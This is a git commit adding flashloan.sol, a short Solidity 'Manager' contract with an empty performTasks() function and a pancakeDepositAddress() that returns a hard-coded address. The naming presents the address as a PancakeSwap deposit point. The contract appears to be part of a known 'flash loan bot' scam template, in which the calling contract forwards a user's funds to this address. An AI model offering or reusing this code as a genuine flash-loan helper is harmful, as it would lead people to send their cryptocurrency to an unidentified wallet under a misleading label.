2d4a81798a6a9de38588f635e7f2ec42767dbeb9
Uso1121 <87182836+Uso1121@users.noreply.github.com>
2021-07-28 22:05:03 +1200

    Create flashloan.sol

---
+++ flashloan.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0xddc5d6D597d904d8C65DAc03b2A9cDaa23843c33;
+	}
+}
